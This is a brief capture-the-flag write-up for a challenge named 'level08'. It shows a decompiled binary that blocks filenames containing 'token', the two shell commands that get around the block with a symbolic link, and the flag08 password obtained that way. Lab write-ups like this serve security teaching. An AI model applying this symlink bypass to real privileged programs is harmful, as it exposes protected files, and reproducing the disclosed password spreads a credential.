At the home directory there is a program "level08" and a file "token".
I only have the right to execute the program.

The disassembled program with ghidra:

int main(int argc,char **argv,char **envp)
{
  char *pcVar1;
  int __fd;
  size_t __n;
  ssize_t sVar2;
  int in_GS_OFFSET;
  int fd;
  int rc;
  char buf [1024];
  undefined local_414 [1024];
  int local_14;

  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc == 1) {                          //Need an argument
    printf("%s [file to read]\n",*argv);
    exit(1);
  }
  pcVar1 = strstr(argv[1],"token");
  if (pcVar1 != (char *)0x0) {              //The name of the file can't contain token
    printf("You may not access \'%s\'\n",argv[1]);
    exit(1);
  }
  __fd = open(argv[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",argv[1]);
  }
  __n = read(__fd,local_414,0x400);         //It read the file
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }
  sVar2 = write(1,local_414,__n);           //It display the file
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail();
  }
  return sVar2;
}

My first solution was to creat a symbolic link to "token" with an other name than token :
    ln -s /home/user/level08/token /tmp/flag
    /home/user/level08/level08 /tmp/flag

And that is how i get this flag by connecting to the user flag08 with the pass : quif5eloekouj29ke0vouxean
